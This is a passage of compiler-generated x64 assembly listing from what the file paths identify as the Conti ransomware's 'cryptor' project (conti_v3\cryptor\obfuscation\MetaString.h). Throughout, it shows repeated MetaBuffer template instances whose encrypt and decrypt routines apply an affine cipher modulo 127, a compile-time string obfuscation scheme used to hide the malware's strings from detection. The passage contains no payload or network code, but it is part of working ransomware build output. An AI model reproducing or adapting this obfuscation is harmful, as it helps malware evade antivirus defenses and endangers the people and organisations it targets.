  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DF@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DF@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DF@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<53,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DF@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<53,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BB@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 25	 sub	 eax, 37			; 00000025H
  00006	44 6b c0 0f	 imul	 r8d, eax, 15

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BB@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 11	 imul	 r8d, eax, 17
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 25	 add	 r8d, 37			; 00000025H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BB@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EH@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EH@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<71,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 2a	 sub	 eax, 42			; 0000002aH
  00006	44 6b c0 22	 imul	 r8d, eax, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EH@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<71,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EH@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EH@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<71,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 47	 imul	 r8d, eax, 71		; 00000047H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 2a	 add	 r8d, 42			; 0000002aH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EH@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<71,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EH@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EH@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<71,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EH@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<71,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$01$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 4b 00 00 00	 mov	 ecx, 75			; 0000004bH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3f	 imul	 r8d, ecx, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$01$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$01$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 45 4b
	00 00 00	 lea	 r8d, DWORD PTR [rax*2+75]
  0000b	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$01$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$01$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$01$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<2,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$01$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<2,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0FO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$06$0FO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,94,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 5e 00 00 00	 mov	 ecx, 94			; 0000005eH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00016	41 f7 e8	 imul	 r8d
  00019	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001e	41 03 d0	 add	 edx, r8d
  00021	c1 fa 06	 sar	 edx, 6
  00024	8b ca		 mov	 ecx, edx
  00026	c1 e9 1f	 shr	 ecx, 31
  00029	03 d1		 add	 edx, ecx
  0002b	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002e	44 2b c1	 sub	 r8d, ecx
  00031	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00035	41 f7 e8	 imul	 r8d
  00038	41 03 d0	 add	 edx, r8d
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b ca		 mov	 ecx, edx
  00040	c1 e9 1f	 shr	 ecx, 31
  00043	03 d1		 add	 edx, ecx
  00045	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00048	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004b	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004f	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0FO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,94,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$06$0FO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$06$0FO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,94,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 07	 imul	 r8d, eax, 7
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 5e	 add	 r8d, 94			; 0000005eH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$06$0FO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,94,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$06$0FO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$06$0FO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<7,94,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$06$0FO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<7,94,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0L@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 39 00 00 00	 mov	 ecx, 57			; 00000039H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 17	 imul	 r8d, ecx, 23

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0L@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0L@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 0b	 imul	 r8d, eax, 11
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 39	 add	 r8d, 57			; 00000039H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0L@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0L@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0L@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<11,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0L@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<11,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GL@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 30	 sub	 eax, 48			; 00000030H
  00006	44 6b c0 13	 imul	 r8d, eax, 19

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
